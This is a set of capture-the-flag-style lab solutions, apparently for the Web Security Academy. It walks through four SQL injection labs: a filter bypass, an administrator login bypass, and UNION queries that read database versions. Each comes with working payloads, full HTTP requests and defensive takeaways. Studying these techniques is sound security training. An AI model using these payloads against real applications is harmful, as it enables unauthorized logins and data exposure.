### [PS-SQLi-01] SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Scenario:** The application's product category filter accepts user input via a URL query parameter and concatenates it directly into the backend database query without parameterization or sanitization. This allows an attacker to alter the query's boolean logic and retrieve records that are normally hidden from public view (such as unreleased products).

**Solution:**

1. Navigate to the shop application and click on any product category filter (e.g., "Gifts").
2. Intercept the resulting HTTP request in Burp Repeater and modify the `category` parameter by appending the SQL injection payload `' OR 1=1--` (URL-encoded as `%27+OR+1%3D1--`).

```http
GET /filter?category=Gifts%27+OR+1%3D1-- HTTP/1.1
Host: target.web-security-academy.net


```

3. Review the request logic. The application intends to run a query similar to `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`. By injecting the payload, the backend query is altered to:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

```

4. Inspect the server's HTML response (or render the page in your browser) to confirm that the `OR 1=1` condition evaluated to true for every row in the database, and the `--` (comment sequence) successfully negated the `AND released = 1` restriction. All products, including hidden ones, are now visible on the page.

> **Key Takeaway:** SQL injection in a `WHERE` clause occurs when untrusted user input alters the intended logical structure of a database query. To prevent this, developers must use parameterized queries (prepared statements) for all database access, ensuring that user input is treated strictly as data rather than executable SQL syntax.

---

### [PS-SQLi-02] SQL injection vulnerability allowing login bypass

**Scenario:** The application's login function constructs a database query by concatenating user-supplied credentials directly into SQL without parameterization. Because the query checks both username and password conditions, altering the query structure allows authentication to succeed as a target account without knowing its password.

**Solution:**

1. Navigate to the login page (`My account`) and submit test credentials while capturing the request in Burp Suite.
2. In Burp Repeater, modify the `username` parameter by closing the string literal and appending a SQL comment sequence (`--`), such as `administrator'--`, with any placeholder value in `password` (URL-encoded in the body as `username=administrator%27--&password=test`).

```http
POST /login HTTP/1.1
Host: target.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&username=administrator%27--&password=test

```

3. Examine how the backend query changes from checking both fields (`WHERE username = '...' AND password = '...'`) to truncating the remainder of the statement after the comment marker:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test'

```

4. Send the request and follow or inspect the response to verify that authentication succeeds as the `administrator` account without validating the password.

> **Key Takeaway:** Authentication logic must never rely on string-concatenated SQL queries where user input can terminate string literals or inject comment syntax. Use parameterized queries (prepared statements) and dedicated password-hashing verification (`password_verify` / salted cryptographic hashes) rather than SQL-level credential comparisons.

---

### [PS-SQLi-03] SQL injection attack, querying the database type and version on Oracle

**Scenario:** The application's category filter concatenates user input directly into an Oracle database query and returns the results in the response. By combining a `UNION` query with Oracle's `v$version` view and the `FROM DUAL` requirement for `SELECT` statements, database version details can be retrieved through a string-capable column.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. In Burp Repeater, send a `UNION` payload using `NULL` values and `FROM DUAL` to confirm column count and identify a string column (e.g., `' UNION SELECT NULL, 'abc' FROM DUAL--`, URL-encoded as `%27+UNION+SELECT+NULL%2C+%27abc%27+FROM+DUAL--`).
3. Once a text column is confirmed, query Oracle's version information from `v$version` (e.g., `' UNION SELECT NULL, banner FROM v$version--` or `' UNION SELECT banner, NULL FROM v$version--`, URL-encoded as `%27+UNION+SELECT+NULL%2C+banner+FROM+v%24version--`).

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C+banner+FROM+v%24version-- HTTP/1.1
Host: target.web-security-academy.net



```

4. Examine how the injected `UNION` appends Oracle version rows from `v$version` to the original query results:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, banner FROM v$version--'

```

5. Inspect the response body to confirm the Oracle database banner/version string is displayed on the page.

> **Key Takeaway:** Oracle requires a `FROM` clause on every `SELECT` (using `DUAL` for literal expressions) and exposes version metadata via views such as `v$version`. Parameterized queries prevent untrusted input from altering query structure or reading system views.

---

### [PS-SQLi-04] SQL injection attack, querying the database type and version on MySQL and Microsoft

**Scenario:** The application's category filter concatenates user input directly into a database query on MySQL or Microsoft SQL Server and reflects query results in the response. Using a `UNION` query with a text-compatible column and `@@version`, the server version string can be retrieved in the output.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. In Burp Repeater, confirm the column count and locate a string-capable column using `UNION SELECT` with `NULL` and a string literal, ending with `-- -` so the space after `--` triggers the comment and the trailing `-` sits safely inside it.
3. Replace the string literal with `@@version` (supported on both MySQL and Microsoft SQL Server) to retrieve database version details through the reflected column:

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C+%40%40version--+- HTTP/1.1
Host: target.web-security-academy.net



```

4. Observe how the injected `UNION` appends `@@version` to the original query results without leaving an unclosed quote outside the comment:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, @@version-- -

```

5. Inspect the response body to confirm the database type and version string appear in the rendered output.

> **Key Takeaway:** MySQL requires whitespace after `--` to treat it as a comment, and trailing `--'` does not close a string literal—it just comments out your own closing quote and breaks the query. Using `-- -` (or `--+` in URL query parameters where `+` decodes to a space) cleanly comments out the remainder of the statement.

---